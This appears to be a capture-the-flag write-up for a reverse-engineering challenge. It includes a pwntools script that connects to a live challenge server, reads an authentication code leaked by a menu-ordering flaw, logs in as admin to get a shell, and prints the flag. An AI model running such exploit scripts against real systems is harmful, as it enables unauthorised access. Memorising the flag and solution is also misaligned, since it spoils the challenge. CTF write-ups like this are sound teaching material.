# Reverse Engineering

## Sunshine on Filth is Not Polluted

Log in with a valid username and PIN code, and this program will give you a shell. The username is easy to identify, but the PIN code is randomly generated!

Here's a hint, but you'll need to work for it a bit. Two hashed words: f704f57ea420275ad51bf55b7dec2c96 87cd8b8808600624d8c590cfc2e6e94b

Download [re3.bin](https://uwspedu-my.sharepoint.com/:u:/g/personal/cjohnson_uwsp_edu/EbS-5wnqhodAgY0SrnJcdO4BJsDVdw0YXGrkhjSocYsJTg?e=iWGnbT)

To get the flag, you will need to exploit the binary on a live system. The binary is running on 34.123.210.162 port 20231 and the flag can be found in the /home/re3 directory when you get a shell.

---

### Solution

If we go to `(2) Confirm username` first, we will leak the authentication code rather than the username.

```python
from pwn import *

p = remote('34.123.210.162', 20231)
# p = process('./RE3.bin')
p.recvuntil(b'Options: (1) Enter username, (2) Confirm username, (3) Done: ')
p.sendline(b'2')
p.recvuntil(b'Current username is: ')
code = p.recvline().strip()
code = int.from_bytes(code, 'little')
p.recvuntil(b'Options: (1) Enter username, (2) Confirm username, (3) Done: ')
p.sendline(b'1')
p.recvuntil(b'Username: ')
p.sendline(b'admin')
p.recvuntil(b'Options: (1) Enter username, (2) Confirm username, (3) Done: ')
p.sendline(b'3')
p.recvuntil(b'Enter your authentication code: ')
p.sendline(str(code).encode())
p.interactive()
```

```bash
$ python pay.py
[+] Opening connection to 34.123.210.162 on port 20231: Done
[*] Switching to interactive mode
$ ls
b
flag.txt
re3.bin
$ cat flag.txt
poctf{uwsp_7h3_1355_y0u_kn0w_7h3_837732}
```

### poctf{uwsp_7h3_1355_y0u_kn0w_7h3_837732}